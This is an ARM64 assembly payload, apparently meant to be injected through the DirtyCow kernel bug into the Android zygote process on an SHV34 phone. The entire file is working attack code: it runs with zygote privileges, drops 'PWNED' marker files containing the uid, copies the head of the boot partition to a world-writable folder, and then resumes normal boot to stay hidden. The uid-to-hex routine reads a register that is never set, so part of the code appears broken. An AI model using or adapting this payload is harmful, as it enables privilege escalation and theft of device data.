// zygote injection payload for SHV34 app_process64 (CVE-2016-5195 DirtyCow)
// linked at 0x3630 (.eh_frame region of app_process64, RX segment)
// On zygote restart: kernel loads patched ELF -> e_entry -> here.
// Payload: write uid evidence files, try reading boot partition (AVC observable),
// then jump back to original _start (0x2254) so zygote boots normally.
    .section .text
    .global _start_p
_start_p:
    mov     x8, #174              // getuid
    svc     0
    mov     w21, w0               // uid
    adr     x6, hexdig

    // fill uid hex into msg1+17, msg2+17, msg3+19 (8 hex chars each)
    adr     x7, msg1
    add     x7, x7, #17
    mov     w5, #8
    bl      filluid
    adr     x7, msg2
    add     x7, x7, #17
    mov     w5, #8
    bl      filluid
    adr     x7, msg3
    add     x7, x7, #19
    mov     w5, #8
    bl      filluid

    // --- write 1: /data/local/tmp/zyg_pwn.txt ---
    mov     x8, #56
    mov     x0, #-100
    adr     x1, path1
    mov     x2, #0x241
    mov     x3, #0x1b6
    svc     0
    cmn     x0, #1
    b.eq    w2skip
    mov     w19, w0
    adr     x1, msg1
    mov     x2, #(msg1_end - msg1)
    mov     x8, #64
    svc     0
    mov     x8, #57
    mov     x0, x19
    svc     0
w2skip:

    // --- write 2: /data/tombstones/zyg_pwn.txt ---
    mov     x8, #56
    mov     x0, #-100
    adr     x1, path2
    mov     x2, #0x241
    mov     x3, #0x1b6
    svc     0
    cmn     x0, #1
    b.eq    w3skip
    mov     w19, w0
    adr     x1, msg2
    mov     x2, #(msg2_end - msg2)
    mov     x8, #64
    svc     0
    mov     x8, #57
    mov     x0, x19
    svc     0
w3skip:

    // --- write 3: /sdcard/zyg_pwn.txt ---
    mov     x8, #56
    mov     x0, #-100
    adr     x1, path3
    mov     x2, #0x241
    mov     x3, #0x1b6
    svc     0
    cmn     x0, #1
    b.eq    bskip
    mov     w19, w0
    adr     x1, msg3
    mov     x2, #(msg3_end - msg3)
    mov     x8, #64
    svc     0
    mov     x8, #57
    mov     x0, x19
    svc     0
bskip:

    // --- probe boot partition: open O_RDONLY + read 4K (AVC observable) ---
    mov     x8, #56
    mov     x0, #-100
    adr     x1, path_boot
    mov     x2, #0
    svc     0
    cmn     x0, #1
    b.eq    done
    mov     w19, w0
    sub     sp, sp, #4096
    mov     x1, sp
    mov     x2, #4096
    mov     x8, #63               // read
    svc     0
    mov     x20, x0               // bytes read
    // write to /data/local/tmp/boot_head.bin
    mov     x8, #56
    mov     x0, #-100
    adr     x1, path4
    mov     x2, #0x241
    mov     x3, #0x1b6
    svc     0
    cmn     x0, #1
    b.eq    5f
    mov     w22, w0
    mov     x1, sp
    mov     x2, x20
    mov     x8, #64
    svc     0
    mov     x8, #57
    mov     x0, x22
    svc     0
5:
    add     sp, sp, #4096
    mov     x8, #57
    mov     x0, x19
    svc     0
done:
    b       orig_start

filluid:
    lsr     w3, w4, #28
    ldrb    w10, [x6, x3]
    strb    w10, [x7], #1
    lsl     w4, w4, #4
    sub     w5, w5, #1
    cbnz    w5, filluid
    ret

path1:     .asciz "/data/local/tmp/zyg_pwn.txt"
path2:     .asciz "/data/tombstones/zyg_pwn.txt"
path3:     .asciz "/sdcard/zyg_pwn.txt"
path_boot: .asciz "/dev/block/bootdevice/by-name/boot"
path4:     .asciz "/data/local/tmp/boot_head.bin"
msg1:
    .ascii "PWNED-LOCAL uid=0x00000000\n"
msg1_end:
msg2:
    .ascii "PWNED-TOMB uid=0x00000000\n"
msg2_end:
msg3:
    .ascii "PWNED-SDCARD uid=0x00000000\n"
msg3_end:
hexdig: .ascii "0123456789abcdef"
